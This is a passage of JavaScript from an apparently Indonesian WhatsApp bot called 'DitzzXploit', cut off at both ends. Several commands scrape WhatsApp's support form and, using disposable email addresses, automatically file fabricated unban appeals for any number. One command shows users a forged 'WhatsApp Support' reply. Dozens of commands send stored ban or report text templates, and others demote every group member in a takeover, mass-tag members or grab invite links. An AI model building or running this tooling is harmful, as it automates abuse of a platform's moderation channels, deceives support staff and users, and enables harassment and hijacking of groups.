let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbannedv6': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `ہیلو واٹس ایپ میرا واٹس ایپ نمبر بلا وجہ بلاک کر دیا گیا۔ براہ کرم میرا واٹس ایپ نمبر دوبارہ فعال کریں کیونکہ اس نمبر میں میرا بہت سا ذاتی ڈیٹا ہے جو میں اس نمبر کے نیچے محفوظ کرتا ہوں اور میں اس نمبر کو اپنے دفتری کاموں کے لیے بھی استعمال کرتا ہوں جو بہت اہم ہے۔ برائے مہربانی میرا واٹس ایپ نمبر جلد از جلد دوبارہ فعال کریں۔ شکریہ. پیر نمبر واٹس ایپ: [+${targetnya}]
`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Tunggu 1-23 jam untuk proses unban`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'fakec1':
if (!isOwner) return reply(`Sok asik bangsat`);
const fakec = ` ${fakec1}



Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(fakec)

break
//=======================================================//

//============================================//
case 'fakec2':
if (!isOwner) return reply(`Sok asik bangsat`);
const tek = ` ${fakec2}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(tek)

break
//=======================================================//
//============================================//
case 'fakec3':
if (!isOwner) return reply(`Sok asik bangsat`);
const hade = ` ${fakec3}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(hade)

break//============================================//
case 'fakec4':
if (!isOwner) return reply(`Sok asik bangsat`);
const wtf = ` ${fakec4}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(wtf)

break
//=======================================================//
//============================================//
case 'fakec5':
if (!isOwner) return reply(`Sok asik bangsat`);
const mmk = ` ${fakec5}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(mmk)

break
//=======================================================//

//============================================//
case 'fakec6':
if (!isOwner) return reply(`Sok asik bangsat`);
const jan = ` ${fakec6}



Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(jan)

break
//=======================================================//
//============================================//
case 'fakec7':
if (!isOwner) return reply(`Sok asik bangsat`);
const lulu = ` ${fakec7}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(lulu)

break
//=======================================================//
//============================================//
case 'fakec8':
if (!isOwner) return reply(`Sok asik bangsat`);
const yanz = ` ${fakec8}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(yanz)

break
//=======================================================//
case 'fakec10':
if (!isOwner) return reply(`Sok asik bangsat`);
const ana = ` ${fakec10}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ana)

break
//=======================================================//
case 'fakec11':
if (!isOwner) return reply(`Sok asik bangsat`);
const mama = ` ${fakec11}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(mama)

break
//=======================================================//
case 'textbanv1':
if (!isOwner) return reply(`Sok asik bangsat`);
const sploer = ` ${textbanv1}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(sploer)

break
//=======================================================//
case 'textbanv2':
if (!isOwner) return reply(`Sok asik bangsat`);
const ban = ` ${textbanv2}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ban)

break
//=======================================================//
case 'textbanv3':
if (!isOwner) return reply(`Sok asik bangsat`);
const masuk = ` ${textbanv3}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(masuk)

break
//=======================================================//
case 'textbanv4':
if (!isOwner) return reply(`Sok asik bangsat`);
const banned = ` ${textbanv4}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(banned)

break
//=======================================================//
case 'textbanv5':
if (!isOwner) return reply(`Sok asik bangsat`);
const car = ` ${textbanv5}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(car)

break
//=======================================================//
case 'textbanv6':
if (!isOwner) return reply(`Sok asik bangsat`);
const capek = ` ${textbanv6}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(capek)

break
//=======================================================//
case 'textbanv7':
if (!isOwner) return reply(`Sok asik bangsat`);
const hem = ` ${textbanv7}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(hem)

break
//=======================================================//
case 'textbanv8':
if (!isOwner) return reply(`Sok asik bangsat`);
const lelah = ` ${textbanv8}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(lelah)

break
//=======================================================//
case 'textbanv9':
if (!isOwner) return reply(`Sok asik bangsat`);
const pem = ` ${textbanv9}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(pem)

break
//=======================================================//
case 'textbanv10':
if (!isOwner) return reply(`Sok asik bangsat`);
const ahh = ` ${textbanv10}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ahh)

break
//=======================================================//
case 'textbanv11':
if (!isOwner) return reply(`Sok asik bangsat`);
const jansok = ` ${textbanv11}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(jansok)

break
//=======================================================//
case 'textbanv12':
if (!isOwner) return reply(`Sok asik bangsat`);
const iain = ` ${textbanv12}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(iain)

break
//=======================================================//
case 'textbanv13':
if (!isOwner) return reply(`Sok asik bangsat`);
const iemin = ` ${textbanv13}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(iemin)

break
//=======================================================//
case 'textbanv14':
if (!isOwner) return reply(`Sok asik bangsat`);
const slepsae = ` ${textbanv14}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(slepsae)

break
//=======================================================//
case 'textbanv15':
if (!isOwner) return reply(`Sok asik bangsat`);
const ngewe = ` ${textbanv15}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ngewe)

break
//=======================================================//
case 'textbanv16':
if (!isOwner) return reply(`Sok asik bangsat`);
const cipok = ` ${textbanv16}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(cipok)

break
//=======================================================//
case 'textbanv17':
if (!isOwner) return reply(`Sok asik bangsat`);
const yasa = ` ${textbanv17}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(yasa)

break
//=======================================================//
case 'textbanv18':
if (!isOwner) return reply(`Sok asik bangsat`);
const dana = ` ${textbanv18}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(dana)

break
//=======================================================//
case 'textbanv19':
if (!isOwner) return reply(`Sok asik bangsat`);
const xnar = ` ${textbanv19}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(xnar)

break
//=======================================================//
case 'textbanv20':
if (!isOwner) return reply(`Sok asik bangsat`);
const coba = ` ${textbanv20}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(coba)

break
//=======================================================//
case 'textbanv21':
if (!isOwner) return reply(`Sok asik bangsat`);
const quo = ` ${textbanv21}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(quo)

break
//=======================================================//
case 'textbanv22':
if (!isOwner) return reply(`Sok asik bangsat`);
const ppk = ` ${textbanv22}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ppk)

break
//=======================================================//
case 'textbanv23':
if (!isOwner) return reply(`Sok asik bangsat`);
const susun = ` ${textbanv23}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(susun)

break
//=======================================================//
case 'textbanv24':
if (!isOwner) return reply(`Sok asik bangsat`);
const mimik = ` ${textbanv24}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(mimik)

break
//=======================================================//
case 'textbanv25':
if (!isOwner) return reply(`Sok asik bangsat`);
const basa = ` ${textbanv25}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(basa)

break
//=======================================================//
case 'textbanv26':
if (!isOwner) return reply(`Sok asik bangsat`);
const telpr = ` ${textbanv26}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(telpr)

break
//=======================================================//
case 'textbanv27':
if (!isOwner) return reply(`Sok asik bangsat`);
const tempro = ` ${textbanv27}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(tempro)

break
//=======================================================//
case 'textbanv28':
if (!isOwner) return reply(`Sok asik bangsat`);
const comst = ` ${textbanv28}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(comst)

break
//=======================================================//
case 'textbanv29':
if (!isOwner) return reply(`Sok asik bangsat`);
const contoj = ` ${textbanv29}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(contoj)

break
//=======================================================//
case 'textbanv30':
if (!isOwner) return reply(`Sok asik bangsat`);
const takut = ` ${textbanv30}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(takut)

break
//=======================================================//
case 'textbanv31':
if (!isOwner) return reply(`Sok asik bangsat`);
const mele = ` ${textbanv31}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(mele)

break
//=======================================================//
case 'textbanv32':
if (!isOwner) return reply(`Sok asik bangsat`);
const epep = ` ${textbanv32}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(epep)

break
//=======================================================//
case 'textbanv33':
if (!isOwner) return reply(`Sok asik bangsat`);
const banedo = ` ${textbanv33}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(banedo)

break
//=======================================================//
case 'textbanv34':
if (!isOwner) return reply(`Sok asik bangsat`);
const power = ` ${textbanv34}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(power)

break
//=======================================================//
case 'textbanv35':
if (!isOwner) return reply(`Sok asik bangsat`);
const afatar = ` ${textbanv35}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(afatar)

break
//=======================================================//
case 'textbanv36':
if (!isOwner) return reply(`Sok asik bangsat`);
const balmond = ` ${textbanv36}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(balmond)

break
//=======================================================//
case 'textbanv37':
if (!isOwner) return reply(`Sok asik bangsat`);
const zilong = ` ${textbanv37}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(zilong)

break
//=======================================================//
case 'textbanv38':
if (!isOwner) return reply(`Sok asik bangsat`);
const nana = ` ${textbanv38}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(nana)

break
//=======================================================//
case 'textunbanv1':
if (!isOwner) return reply(`Sok asik bangsat`);
const vaga = ` ${textunbanv1}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(vaga)

break
//=======================================================//
case 'textunbanv2':
if (!isOwner) return reply(`Sok asik bangsat`);
const bandar = ` ${textunbanv2}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(bandar)

break
//=======================================================//
case 'textunbanv3':
if (!isOwner) return reply(`Sok asik bangsat`);
const masokpakeok = ` ${textunbanv3}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(masokpakeok)

break
//=======================================================//
case 'textunbanv4':
if (!isOwner) return reply(`Sok asik bangsat`);
const typo = ` ${textunbanv4}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(typo)

break
//=======================================================//
case 'textunbanv5':
if (!isOwner) return reply(`Sok asik bangsat`);
const sokasim = ` ${textunbanv5}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(sokasim)

break
//=======================================================//
case 'textunbanv6':
if (!isOwner) return reply(`Sok asik bangsat`);
const akakaka = ` ${textunbanv6}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(akakaka)

break
//=======================================================//
case 'textunbanv7':
if (!isOwner) return reply(`Sok asik bangsat`);
const kopok = ` ${textunbanv7}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(kopok)

break
//=======================================================//
case 'textunbanv8':
if (!isOwner) return reply(`Sok asik bangsat`);
const tehyung = ` ${textunbanv8}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(tehyung)

break
//=======================================================//
case 'textunbanv9':
if (!isOwner) return reply(`Sok asik bangsat`);
const ahhyan = ` ${textunbanv9}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ahhyan)

break
//=======================================================//
case 'textunbanv10':
if (!isOwner) return reply(`Sok asik bangsat`);
const yamete = ` ${textunbanv10}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(yamete)

break
//=======================================================//
case 'textunbanv11':
if (!isOwner) return reply(`Sok asik bangsat`);
const suuu = ` ${textunbanv11}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(suuu)

break
//=======================================================//
case 'textunbanv12':
if (!isOwner) return reply(`Sok asik bangsat`);
const huuuu = ` ${textunbanv12}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(huuuu)

break
//=======================================================//
case 'textunbanv13':
if (!isOwner) return reply(`Sok asik bangsat`);
const gaje = ` ${textunbanv13}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(gaje)

break
//=======================================================//
case 'textunbanv14':
if (!isOwner) return reply(`Sok asik bangsat`);
const well = ` ${textunbanv14}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(well)

break
//=======================================================//
case 'textunbanv15':
if (!isPremium && !isOwner) return reply(`Sok asik bangsat`);
const lempo = ` ${textunbanv15}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(lempo)

break
//=======================================================//
case 'textunbanv16':
if (!isPremium && !isOwner) return reply(`Sok asik bangsat`);
const cok = ` ${textunbanv16}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(cok)

break
//=======================================================//
case 'textunbanv17':
if (!isPremium && !isOwner) return reply(`Sok asik bangsat`);
const sayasuka = ` ${textunbanv17}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(sayasuka)

break
//=======================================================//
case 'textunbanv18':
if (!isPremium && !isOwner) return reply(`Sok asik bangsat`);
const oooooooo= ` ${textunbanv18}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(oooooooo)

break
//=======================================================//
case 'textunbanv19':
if (!isPremium && !isOwner) return reply(`Sok asik bangsat`);
const omaaavaaaaaaaa = ` ${textunbanv19}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(omaaavaaaaaaaa)

break
//=======================================================//
case 'textunbanv20':
if (!isPremium && !isOwner) return reply(`Sok asik bangsat`);
const bykepo = ` ${textunbanv20}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(bykepo)

break
//=======================================================//
case 'textunbanv21':
if (!isPremium && !isOwner) return reply(`Sok asik bangsat`);
const unbannned = ` ${textunbanv21}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(unbannned)

break
//=================[ BACOT🗿 ]=========================//
case 'textunbanpremv1':
if (!isPremium && !isOwner) return reply(`Sok asik bangsat`);
const premi = ` ${textunbanpremv1}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(premi)

break
//=======================================================//
case 'textunbanpremv2':
if (!isPremium && !isOwner) return reply(`Sok asik bangsat`);
const kelasss = ` ${textunbanpremv2}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(kelasss)

break
//=======================================================//
case 'textunbanpremv3':
if (!isPremium && !isOwner) return reply(`Sok asik bangsat`);
const eek = ` ${textunbanpremv3}


Powered By *@${global.owner.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(eek)

break
case'allkudet':
if (!isOwner) return reply('*Khusus Zans Offcial Doang Woii!!*')
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
var groupe = await Awa.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Awa.groupParticipantsUpdate(from, mems, 'promote')
break
case'kudet':
if (!isOwner) return reply(`Khusus Zans Offcial Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
var groupe = await Awa.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Awa.groupParticipantsUpdate(from, mems, 'demote')
break
case "linkgc": case "linkgroup":{
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
const url = await DitzzXploit.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
reply(asu)
}
break
case "hidetag": {
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!q) return reply(`Teks?`)
global.hit = q
DitzzXploit.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case "add": {
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
